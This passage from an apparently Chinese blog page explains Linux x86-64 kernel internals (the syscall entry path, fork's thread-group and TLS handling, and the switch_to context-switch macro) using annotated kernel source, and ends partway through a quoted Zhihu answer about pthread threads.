class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Interrupts are off on entry.</span></span><br><span class="line"><span class="comment"> * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,</span></span><br><span class="line"><span class="comment"> * it is too small to ever cause noticeable irq latency.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A hypervisor implementation might want to use a label</span></span><br><span class="line"><span class="comment"> * after the swapgs, so that it can do the swapgs</span></span><br><span class="line"><span class="comment"> * for the guest and jump here on syscall.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">GLOBAL(entry_SYSCALL_64_after_swapgs)</span><br><span class="line"></span><br><span class="line">movq%rsp, PER_CPU_VAR(rsp_scratch)  <span class="comment">// 临时保存至PER_CPU_VAR(rsp_scratch)</span></span><br><span class="line">movqPER_CPU_VAR(cpu_current_top_of_stack), %rsp // 切换内核栈</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq$__USER_DS<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line"><span class="function">pushq<span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span><span class="comment">/* pt_regs-&gt;sp */</span> <span class="comment">// 压至对应线程的内核栈</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment"> * Re-enable interrupts.</span></span></span><br><span class="line"><span class="function"><span class="comment"> * We use &#x27;rsp_scratch&#x27; as a scratch space, hence irq-off block above</span></span></span><br><span class="line"><span class="function"><span class="comment"> * must execute atomically in the face of possible interrupt-driven</span></span></span><br><span class="line"><span class="function"><span class="comment"> * task preemption. We must enable interrupts only after we&#x27;re done</span></span></span><br><span class="line"><span class="function"><span class="comment"> * with using rsp_scratch:</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="title">ENABLE_INTERRUPTS</span><span class="params">(CLBR_NONE)</span></span></span><br><span class="line">pushq%r11/* pt_regs-&gt;flags */</span><br><span class="line">pushq$__USER_CS<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq%rcx<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq%rax<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq%rdi<span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq%rsi<span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq%rdx<span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq%rcx<span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq$-ENOSYS<span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq%r8<span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq%r9<span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq%r10<span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq%r11<span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub$(<span class="number">6</span>*<span class="number">8</span>), %rsp<span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line">  ......</span><br><span class="line">  RESTORE_C_REGS_EXCEPT_RCX_R11 <span class="comment">// 恢复所有的寄存器，除了rcx以及r11</span></span><br><span class="line">movqRIP(%rsp), %rcx  // 单独恢复rcx，因为在调用USERGS_SYSRET64之前，需要将需要返回的用户态地址(syscall下一行指令的地址)保存在rcx中</span><br><span class="line">movqEFLAGS(%rsp), %r11 // 恢复r11，将老的eflags加载入r11</span><br><span class="line">movqRSP(%rsp), %rsp // 恢复旧的用户态rsp</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 64-bit SYSRET restores rip from rcx,</span></span><br><span class="line"><span class="comment"> * rflags from r11 (but RF and VM bits are forced to 0),</span></span><br><span class="line"><span class="comment"> * cs and ss are loaded from MSRs.</span></span><br><span class="line"><span class="comment"> * Restoration of rflags re-enables interrupts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NB: On AMD CPUs with the X86_BUG_SYSRET_SS_ATTRS bug, the ss</span></span><br><span class="line"><span class="comment"> * descriptor is not reinitialized.  This means that we should</span></span><br><span class="line"><span class="comment"> * avoid SYSRET with SS == NULL, which could happen if we schedule,</span></span><br><span class="line"><span class="comment"> * exit the kernel, and re-enter using an interrupt vector.  (All</span></span><br><span class="line"><span class="comment"> * interrupt entries on x86_64 set SS to NULL.)  We prevent that</span></span><br><span class="line"><span class="comment"> * from happening by reloading SS in __switch_to.  (Actually</span></span><br><span class="line"><span class="comment"> * detecting the failure in 64-bit userspace is tricky but can be</span></span><br><span class="line"><span class="comment"> * done.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">USERGS_SYSRET64</span><br></pre></td></tr></table></figure><h2 id="Syscall流程"><a href="#Syscall流程" class="headerlink" title="Syscall流程"></a>Syscall流程</h2><ol><li>user mode程序准备好各项参数，并执行syscall</li><li>执行syscall时，硬件自动将syscall下一条指令的地址赋值给rcx，并从IA32_LSTAR MSR读出rip的地址并加载rip</li><li>由于IA32_LSTAR MSR中的值为<code>entry_SYSCALL_64</code>的起始位置，故跳转至syscall处理程序入口处开始执行</li><li>首先kernel保存用户态下的rsp至<code>rsp_scratch</code>这个per_cpu变量中</li><li>之后kernel从tr寄存器中读出选择子，从gdtr寄存器中读出gdt表的基地址，然后基于选择子在gdt表中找到对应的tss段描述符，确定tss段基地址，从tss段中读出sp0以及iomap，利用sp0的值切换用户态栈至对应内核栈</li><li>将保存的rsp压入栈中保存</li><li>将其余各类寄存器压入内核栈中(除了bp, bx, r12-15，根据abi，这几个寄存器不会被保存 )</li><li>kernel检查<code>sys_call_table</code>中是否存在rax所指示的syscall类型，如果不存在，跳至10</li><li>如果存在，查询<code>sys_call_table</code>表中对应的函数指针，call对应的函数，在call之前，将r10寄存器的值赋值给rcx，使函数调用传参符合标准</li><li>执行完成后，调用<code>RESTORE_C_REGS_EXCEPT_RCX_R11</code>恢复各个寄存器的值(除了rcx，r11)，将之前保存的rip值(进程发起syscall时，硬件会将syscall的下一条指令保存在rcx寄存器中)恢复至rcx寄存器，eflag值恢复至r11，调用<code>USERGS_SYSRET64</code>宏，借助sysretq指令退出至用户态</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Interrupts are off on entry.</span></span><br><span class="line"><span class="comment"> * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,</span></span><br><span class="line"><span class="comment"> * it is too small to ever cause noticeable irq latency.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A hypervisor implementation might want to use a label</span></span><br><span class="line"><span class="comment"> * after the swapgs, so that it can do the swapgs</span></span><br><span class="line"><span class="comment"> * for the guest and jump here on syscall.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">GLOBAL(entry_SYSCALL_64_after_swapgs)</span><br><span class="line"></span><br><span class="line">movq%rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movqPER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq$__USER_DS<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line"><span class="function">pushq<span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span><span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment"> * Re-enable interrupts.</span></span></span><br><span class="line"><span class="function"><span class="comment"> * We use &#x27;rsp_scratch&#x27; as a scratch space, hence irq-off block above</span></span></span><br><span class="line"><span class="function"><span class="comment"> * must execute atomically in the face of possible interrupt-driven</span></span></span><br><span class="line"><span class="function"><span class="comment"> * task preemption. We must enable interrupts only after we&#x27;re done</span></span></span><br><span class="line"><span class="function"><span class="comment"> * with using rsp_scratch:</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="title">ENABLE_INTERRUPTS</span><span class="params">(CLBR_NONE)</span></span></span><br><span class="line">pushq%r11/* pt_regs-&gt;flags */</span><br><span class="line">pushq$__USER_CS<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq%rcx<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq%rax<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq%rdi<span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq%rsi<span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq%rdx<span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq%rcx<span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq$-ENOSYS<span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq%r8<span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq%r9<span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq%r10<span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq%r11<span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub$(<span class="number">6</span>*<span class="number">8</span>), %rsp<span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line"></span><br><span class="line">testl$_TIF_WORK_SYSCALL_ENTRY, ASM_THREAD_INFO(TI_flags, %rsp, SIZEOF_PTREGS)</span><br><span class="line">jnztracesys</span><br><span class="line">entry_SYSCALL_64_fastpath:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __SYSCALL_MASK == ~0</span></span><br><span class="line">cmpq$__NR_syscall_max, %rax</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">andl$__SYSCALL_MASK, %eax</span><br><span class="line">cmpl$__NR_syscall_max, %eax</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">ja<span class="number">1f</span><span class="comment">/* return -ENOSYS (already in pt_regs-&gt;ax) */</span></span><br><span class="line">movq%r10, %rcx</span><br><span class="line"><span class="function">call*<span class="title">sys_call_table</span><span class="params">(, %rax, <span class="number">8</span>)</span></span></span><br><span class="line">movq%rax, RAX(%rsp)</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Syscall return path ending with SYSRET (fast path).</span></span><br><span class="line"><span class="comment"> * Has incompletely filled pt_regs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LOCKDEP_SYS_EXIT</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,</span></span><br><span class="line"><span class="comment"> * it is too small to ever cause noticeable irq latency.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">DISABLE_INTERRUPTS(CLBR_NONE)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We must check ti flags with interrupts (or at least preemption)</span></span><br><span class="line"><span class="comment"> * off because we must *never* return to userspace without</span></span><br><span class="line"><span class="comment"> * processing exit work that is enqueued if we&#x27;re preempted here.</span></span><br><span class="line"><span class="comment"> * In particular, returning to userspace with any of the one-shot</span></span><br><span class="line"><span class="comment"> * flags (TIF_NOTIFY_RESUME, TIF_USER_RETURN_NOTIFY, etc) set is</span></span><br><span class="line"><span class="comment"> * very bad.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">testl$_TIF_ALLWORK_MASK, ASM_THREAD_INFO(TI_flags, %rsp, SIZEOF_PTREGS)</span><br><span class="line">jnzint_ret_from_sys_call_irqs_off<span class="comment">/* Go to the slow path */</span></span><br><span class="line"></span><br><span class="line">RESTORE_C_REGS_EXCEPT_RCX_R11</span><br><span class="line">movqRIP(%rsp), %rcx</span><br><span class="line">movqEFLAGS(%rsp), %r11</span><br><span class="line">movqRSP(%rsp), %rsp</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 64-bit SYSRET restores rip from rcx,</span></span><br><span class="line"><span class="comment"> * rflags from r11 (but RF and VM bits are forced to 0),</span></span><br><span class="line"><span class="comment"> * cs and ss are loaded from MSRs.</span></span><br><span class="line"><span class="comment"> * Restoration of rflags re-enables interrupts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NB: On AMD CPUs with the X86_BUG_SYSRET_SS_ATTRS bug, the ss</span></span><br><span class="line"><span class="comment"> * descriptor is not reinitialized.  This means that we should</span></span><br><span class="line"><span class="comment"> * avoid SYSRET with SS == NULL, which could happen if we schedule,</span></span><br><span class="line"><span class="comment"> * exit the kernel, and re-enter using an interrupt vector.  (All</span></span><br><span class="line"><span class="comment"> * interrupt entries on x86_64 set SS to NULL.)  We prevent that</span></span><br><span class="line"><span class="comment"> * from happening by reloading SS in __switch_to.  (Actually</span></span><br><span class="line"><span class="comment"> * detecting the failure in 64-bit userspace is tricky but can be</span></span><br><span class="line"><span class="comment"> * done.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">USERGS_SYSRET64</span><br></pre></td></tr></table></figure><p>不错的资料: <a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><h2 id="Fork设置线程组组长"><a href="#Fork设置线程组组长" class="headerlink" title="Fork设置线程组组长"></a>Fork设置线程组组长</h2><p>由于clone，vfork，fork这些系统调用最终都是调用了<code>_do_fork</code>函数，但是三者的<code>clone_flags</code>参数不同，clone更是可以十分灵活的设定<code>clone_flags</code>，基于<code>clone_flags</code>，fork会决定新的线程到底归属哪一个线程组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ok, now we should be set up.. */</span></span><br><span class="line">p-&gt;pid = pid_nr(pid);</span><br><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_THREAD) &#123; <span class="comment">// 判断是否是CLONE_THREAD(0x00010000)，一般fork的clone_flags为0x1200011，不进入此分支</span></span><br><span class="line">p-&gt;exit_signal = <span class="number">-1</span>; </span><br><span class="line">p-&gt;group_leader = current-&gt;group_leader; <span class="comment">// 当使用pthread_create创建线程时，进入此分支，新的线程的线程组组长被设置为主线程</span></span><br><span class="line">p-&gt;tgid = current-&gt;tgid;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_PARENT)</span><br><span class="line">p-&gt;exit_signal = current-&gt;group_leader-&gt;exit_signal;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p-&gt;exit_signal = (clone_flags &amp; CSIGNAL);</span><br><span class="line">p-&gt;group_leader = p; <span class="comment">// fork时，进入此分支，新的线程的线程组组长被设置为自己，从而产生了我们所谓的新&quot;进程&quot;</span></span><br><span class="line">p-&gt;tgid = p-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Fork也会设置TLS基地址？"><a href="#Fork也会设置TLS基地址？" class="headerlink" title="Fork也会设置TLS基地址？"></a>Fork也会设置TLS基地址？</h2><p>是的，fork实际上也会，而不仅仅只是glibc主动发出<code>arch_prctl</code>系统调用从而设置自身线程的TLS基地址(也就是fs寄存器基地址的值)</p><p>设置函数为<code>copy_thread_tls</code>，实现部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set a new TLS for the child thread?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_SETTLS) &#123; <span class="comment">// CLONE_SETTLS为0x00080000，一般clone_flags不会在将这一bit置位，所以虽然fork可以为fork出来的新线程设置tls基地址，但是很少用到，大多数情况下还是由glibc主动发起</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IA32_EMULATION</span></span><br><span class="line"><span class="keyword">if</span> (is_ia32_task())</span><br><span class="line">err = do_set_thread_area(p, <span class="number">-1</span>,</span><br><span class="line">(struct user_desc __user *)tls, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">err = do_arch_prctl(p, ARCH_SET_FS, tls); <span class="comment">// 设置tls基地址，在linux4.5内核版本中，do_arch_prctl仍旧可以处理32位进程以及64位进程的请求，但是在之后的新内核中，do_arch_prctl将不再处理32位程序的请求，glibc在新内核环境下也同样区分了32位程序以及64位程序请求修改tls基地址的方式，不再统一使用do_arch_prctl，相关知识可以在bypass_Canary一文中看到</span></span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程被切换时，内核何时保存通用寄存器？"><a href="#线程被切换时，内核何时保存通用寄存器？" class="headerlink" title="线程被切换时，内核何时保存通用寄存器？"></a>线程被切换时，内核何时保存通用寄存器？</h2><p>在线程被调度时，<code>__schedule()</code>函数将会调用<code>context_switch</code>函数，<code>context_switch</code>函数进一步调用<code>switch_to</code>宏，其宏实现如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAVE_CONTEXT    <span class="meta-string">&quot;pushq %%rbp ; movq %%rsi,%%rbp\n\t&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESTORE_CONTEXT <span class="meta-string">&quot;movq %%rbp,%%rsi ; popq %%rbp\t</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string">/*</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"> * There is no need to save or restore flags, because flags are always</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"> * clean in kernel mode, with the possible exception of IOPL.  Kernel IOPL</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"> * has no effect.</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"> */</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">#define switch_to(prev, next, last) \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">asm volatile(SAVE_CONTEXT  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>movq %%rsp,%P[threadrsp](%[prev])\n\t<span class="meta-string">&quot; /* save RSP */  \ // 切换esp，相当于切换线程</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>movq %P[threadrsp](%[next]),%%rsp\n\t<span class="meta-string">&quot; /* restore RSP */  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>call __switch_to\n\t<span class="meta-string">&quot;  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>movq <span class="meta-string">&quot;__percpu_arg([current_task])&quot;</span>,%%rsi\n\t<span class="meta-string">&quot;  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     __switch_canary  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>movq %P[thread_info](%%rsi),%%r8\n\t<span class="meta-string">&quot;  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>movq %%rax,%%rdi\n\t<span class="meta-string">&quot;   \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>testl  %[_tif_fork],%P[ti_flags](%%r8)\n\t<span class="meta-string">&quot;  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     &quot;</span>jnz   ret_from_fork\n\t<span class="meta-string">&quot;  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     RESTORE_CONTEXT  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     : &quot;</span>=a<span class="meta-string">&quot; (last)    \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       __switch_canary_oparam  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     : [next] &quot;</span>S<span class="meta-string">&quot; (next), [prev] &quot;</span>D<span class="meta-string">&quot; (prev),  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       [threadrsp] &quot;</span>i<span class="meta-string">&quot; (offsetof(struct task_struct, thread.sp)), \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       [ti_flags] &quot;</span>i<span class="meta-string">&quot; (offsetof(struct thread_info, flags)),  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       [_tif_fork] &quot;</span>i<span class="meta-string">&quot; (_TIF_FORK),    \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       [thread_info] &quot;</span>i<span class="meta-string">&quot; (offsetof(struct task_struct, stack)),   \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       [current_task] &quot;</span>m<span class="meta-string">&quot; (current_task)  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       __switch_canary_iparam  \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">     : &quot;</span>memory<span class="meta-string">&quot;, &quot;</span>cc<span class="meta-string">&quot; __EXTRA_CLOBBER) // 在clobber list中设置了__EXTRA_CLOBBER</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       ......</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">       #define __EXTRA_CLOBBER  \  // 大部分的通用寄存器，除了rdi,rsi,rsp,rbp,rax</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">, &quot;</span>rcx<span class="meta-string">&quot;, &quot;</span>rbx<span class="meta-string">&quot;, &quot;</span>rdx<span class="meta-string">&quot;, &quot;</span>r8<span class="meta-string">&quot;, &quot;</span>r9<span class="meta-string">&quot;, &quot;</span>r10<span class="meta-string">&quot;, &quot;</span>r11<span class="meta-string">&quot;, \</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">  &quot;</span>r12<span class="meta-string">&quot;, &quot;</span>r13<span class="meta-string">&quot;, &quot;</span>r14<span class="meta-string">&quot;, &quot;</span>r15<span class="meta-string">&quot;, &quot;</span>flags<span class="meta-string">&quot;</span></span></span><br></pre></td></tr></table></figure><p>可以看到，switch_to宏通过内联汇编中的clobber list来使得gcc自动保存了指定寄存器的值(在执行汇编前push)，并在汇编结束后恢复这些寄存器(在完成汇编前pop)，由于switch_to切换了esp，所以也就自动实现了”保存prev线程的通用寄存器至prev内核栈上，加载next线程的通用寄存器至next内核栈上”</p><h2 id="pthread库创建的线程是属于用户级线程还是内核级线程？"><a href="#pthread库创建的线程是属于用户级线程还是内核级线程？" class="headerlink" title="pthread库创建的线程是属于用户级线程还是内核级线程？"></a>pthread库创建的线程是属于用户级线程还是内核级线程？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">作者：大河</span><br><span class="line">链接：https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;35128513&#x2F;answer&#x2F;148038406</span><br><span class="line">来源：知乎</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br><span class="line"></span><br><span class="line">这个事情，还真不是一句话就能回答的，因为涉及到Linux和编译器的版本关于线程的概念不多说了，内核级和用户级线程的定义网上也有，简单的说：内核级就是操作系统内核支持，用户级就是函数库实现（也就是说，不管你操作系统是不是支持线程的，我都可以在你上面用多线程编程）。好了，那么，我们首先明白一件事：不管Linux还是什么OS，都可以多线程编程的，怎么多线程编程呢？程序员要创建一个线程，当然需要使用xxx函数，这个函数如果是操作系统本身就提供的系统函数，当然没问题，操作系统创建的线程，自然是内核级的了。如果操作系统没有提供“创建线程”的函数（比如Linux 2.4及以前的版本，因为Linux刚诞生那时候，还没有“线程”的概念，能处理多“进程”就不错了），当然你程序员也没办法在操作系统上创建线程。所以，Linux 2.4内核中不知道什么是“线程”，只有一个“task_struct”的数据结构，就是进程。那么，后来随着科学技术的发展，大家提出线程的概念，而且，线程有时候的确是个好东西，于是，我们希望Linux能加入“多线程”编程。要修改一个操作系统，那是很复杂的事情，特别是当操作系统越来越庞大的时候。怎么才能让Linux支持“多线程”呢？首先，最简单的，就是不去动操作系统的“内核”，而是写一个函数库来“模拟”线程。也就是说，我用C写一个函数，比如 